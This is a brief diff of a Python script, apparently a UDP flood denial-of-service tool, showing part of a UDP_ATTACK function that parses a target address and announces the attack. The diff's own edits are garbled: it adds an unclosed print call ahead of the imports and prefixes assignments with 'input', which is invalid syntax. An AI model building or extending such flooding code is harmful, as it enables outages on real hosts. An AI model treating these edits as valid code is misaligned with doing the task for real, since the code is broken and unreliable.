@@ -1,3 +1,4 @@
+print("\033[1;31m"
 import sys
 import os
 import time
@@ -20,13 +21,13 @@ def UDP_ATTACK(threads, attack_time, target):
 	# Finish
 	global FINISH
 	FINISH = False
-	target_ip = target.split(":")[0]
-	target_port = int(target.split(":")[1])
+	input target_ip = target.split(":")[0]
+	input target_port = int(target.split(":")[1])
 
 	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting UDP attack...")
 	
 
-	threads_list = []
+	input threads_list = []
 
 	# UDP flood
 	def udp_flood():
